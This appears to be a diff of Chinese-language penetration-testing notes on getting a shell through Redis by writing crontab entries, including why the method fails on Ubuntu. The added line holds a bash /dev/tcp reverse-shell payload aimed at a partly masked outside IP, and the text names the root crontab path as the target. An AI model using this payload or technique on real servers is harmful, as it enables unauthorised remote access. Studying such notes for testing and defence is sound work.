@@ -280,11 +280,7 @@ redis-bitsÀ@ú^EctimeÂ}æ^R_ú^Hused-memÂ¨Ó^L^@ú^Laof-preambleÀ^@þ^@û^A
 ```
 16进制查看，
 ![/data/typora_assets/redis/20200718214546791.png](https://i.loli.net/2020/07/24/Vzei6OFRBC8aSGX.png)
-按照
-
-https://lorexxar.cn/2016/12/03/redis-getshell/ 
-
-这篇文章所讲好像发生了截断？但是具体怎么个截断法，没搞明白，是否可能构造出完美payload有待研究？如果写入字符比较少就不会发生截断，例如，
+按照https://lorexxar.cn/2016/12/03/redis-getshell/这篇文章所讲好像发生了截断？但是具体怎么个截断法，没搞明白，是否可能构造出完美payload有待研究？如果写入字符比较少就不会发生截断，例如，
 ![/data/typora_assets/redis/20200718220052178.png](https://i.loli.net/2020/07/24/3TlSW2YkRxQreUf.png)
 最后我们尝试一下，如果不发生截断的情况下写到`/var/spool/cron/crontabs/root`文件，能否反弹shell，我们手动更改`/var/spool/cron/crontabs/root`文件内容如下，
 
@@ -302,7 +298,7 @@ redis-bitsÀ@ú^EctimeÂ^G^@^S_ú^Hused-memÂè!^M^@ú^Laof-preambleÀ^@þ^@û^A
 总结：
 
 - centos下可以成功写crontab反弹shell。
-- ubuntu下无法写crontab反弹shell，主要原因在于ubuntu对于crontab格式要求比较严格，不允许有语法出错，而redis在写入的时候，在前、后都会附加redis的一些信息；另外就是ubuntu下利用crontab使用bash反弹shell是无法成功的，原因是ubuntu下执行 crontab 使用的是 sh , 而 sh 软连接的是dash ，而不是 bash，那么如果你直接在 cron 里面写 bash - i xx 的反弹是不可能成功的，解决方法有两种，一种就是使用 Python 调用 /bin/sh 反弹 shell ，还有一种可以尝试写 sh 文件，然后用 cron 去执行。利用python可以成功反弹shell，但是python反弹shell的payload比较长，利用redis写到crontab文件的时候会发生莫名的payload截断；最后就是ubuntu用户定时任务必须在600权限才能执行，否则提示INSECURE MODE不予执行。
+- ubuntu下无法写crontab反弹shell，主要原因在于ubuntu对于crontab格式要求比较严格，不允许有语法出错，而redis在写入的时候，在前、后都会附加redis的一些信息；另外就是ubuntu下利用crontab使用bash反弹shell是无法成功的，原因是执行 crontab 使用的是 `/bin/sh` , 而ubuntu下` /bin/sh` 软连接的是dash ，而不是 bash，那么如果你直接在 cron 里面写 bash - i xx 的反弹是不可能成功的，解决方法有三种，一种是改写为`bash -c "bash -i  >&/dev/tcp/123.207.x.x/1234 0>&1"`，另一种就是使用 Python 调用 `/bin/sh` 反弹 shell ，还有一种可以尝试写 sh 文件，然后用 cron 去执行。利用python可以成功反弹shell，但是python反弹shell的payload比较长，利用redis写到crontab文件的时候会发生莫名的payload截断；最后就是ubuntu用户定时任务必须在600权限才能执行，否则提示INSECURE MODE不予执行。
 
 #### webshell
 
@@ -686,6 +682,7 @@ Background saving started
 - https://blog.szfszf.top/article/6/
 - https://www.onebug.org/websafe/98675.html
 - https://lorexxar.cn/2016/12/03/redis-getshell/
+- https://m3lon.github.io/2019/03/18/%E8%A7%A3%E5%86%B3ubuntu-crontab%E5%8F%8D%E5%BC%B9shell%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%97%AE%E9%A2%98/
 - https://saucer-man.com/information_security/283.html
 - https://github.com/vulhub/redis-rogue-getshell
 - https://paper.seebug.org/975/
